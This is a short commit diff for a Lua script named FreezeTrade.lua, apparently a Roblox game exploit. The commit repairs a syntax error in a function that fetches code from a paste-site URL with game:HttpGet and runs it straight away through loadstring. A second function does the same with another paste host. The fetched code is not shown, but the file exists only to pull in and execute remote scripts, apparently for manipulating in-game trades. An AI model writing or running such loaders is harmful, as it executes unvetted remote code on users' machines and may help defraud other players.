9a8bb7a5937f95a8026d296f8549b7f89959a7b8
XenaScriptX <kenjieclark30@gmail.com>
2026-09-12 02:08:34 +0800

    Update FreezeTrade.lua

--- FreezeTrade.lua
+++ FreezeTrade.lua
@@ -1,5 +1,5 @@
 local function s1() 
-    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/ehuvhIyDxB/0", true", true))()
+   loadstring(game:HttpGet("https://cdn.sourceb.in/bins/ehuvhIyDxB/0", true))()
 end 
 local function s2() 
     loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/no9DMUGjAklMKrH4/raw", true))()
